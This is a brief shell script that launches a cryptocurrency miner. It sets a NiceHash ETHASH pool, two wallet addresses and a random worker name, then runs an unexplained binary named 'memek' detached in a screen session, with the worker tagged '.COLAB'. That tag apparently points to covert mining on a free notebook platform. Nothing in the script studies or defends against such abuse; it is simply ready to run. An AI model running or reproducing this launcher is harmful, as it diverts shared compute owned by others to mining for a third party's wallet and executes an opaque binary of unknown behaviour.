POOL=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
WALLET2=3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4
WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-P)
chmod +x memek
screen -dmS Running1 ./memek --algo ETHASH --pool $POOL --user $WALLET2.COLAB
